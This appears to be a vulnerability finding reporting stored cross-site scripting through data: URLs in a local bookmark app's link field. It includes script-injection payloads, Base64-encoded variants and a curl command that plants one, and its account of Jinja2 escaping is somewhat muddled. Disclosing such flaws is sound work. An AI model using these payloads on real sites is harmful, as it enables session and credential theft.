title: Stored XSS via data: URL in Bookmark Field
description:
The bookmark application is vulnerable to stored XSS attacks through data: URLs. When users add bookmarks with data: protocol URLs (particularly with Base64 encoded content), the URLs are stored unescaped in the href attribute of the displayed bookmark link.

The vulnerability exists because:
1. The application does not validate or restrict URL schemes to safe protocols (http, https)
2. The URL is rendered directly in the href attribute without encoding: `<a href="{{ item.url }}">`
3. While Jinja2 auto-escapes text content, URL attributes are not escaped by default when the context requires raw URL values
4. This allows arbitrary data: URLs to bypass filtering

The data: URL scheme can embed HTML and JavaScript that executes when clicked. Base64 encoding the payload bypasses simple pattern matching or string-based filtering:
- `data:text/html,<script>alert('XSS')</script>`
- `data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`

This is particularly dangerous because the JavaScript payload can be Base64 encoded, making it difficult to detect through basic input validation.
impact:
An attacker can execute arbitrary JavaScript in the browsers of users who click on bookmarks containing data: URLs. The impact includes:
- Session hijacking and credential theft
- Cookie exfiltration
- Keylogging and form interception
- Malware distribution
- Account takeover
- Spreading of malicious content through bookmarks

The vulnerability can be chained with CSRF (as found in existing findings) to create bookmarks in other users' accounts, leading to widespread exploitation.
evidence: POC Execution Results: [+] Successfully added bookmark with data: URL payload: - Base64 Payload: PHNjcmlwdD5hbGVydCgnWFNTIHZpYSBkYXRhIFVSTCcpPC9zY3JpcHQ+ - Data URL: data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIHZpYSBkYXRhIFVSTCcpPC9zY3JpcHQ+ [+] STORED XSS CONFIRMED: data: URL found unescaped in href attribute [+] Vulnerable HTML Output: ```html data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIHZpYSBkYXRhIFVSTCcpPC9zY3JpcHQ ``` [+] Impact: Clicking this link will execute the embedded JavaScript code (alert('XSS via data URL')) Test Command: ```bash curl -X POST http://localhost:5000/add \ -d "name=XSSTest&url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIHZpYSBkYXRhIFVSTCcpPC9zY3JpcHQ+" ``` Result: The data: URL appears unescaped in the href attribute of the bookmark link in the /list endpoint response, confirming stored XSS vulnerability.
references: OWASP A03:2021 - Injection (XSS), CWE-79 (Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')), CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')), MDN: data URLs and XSS
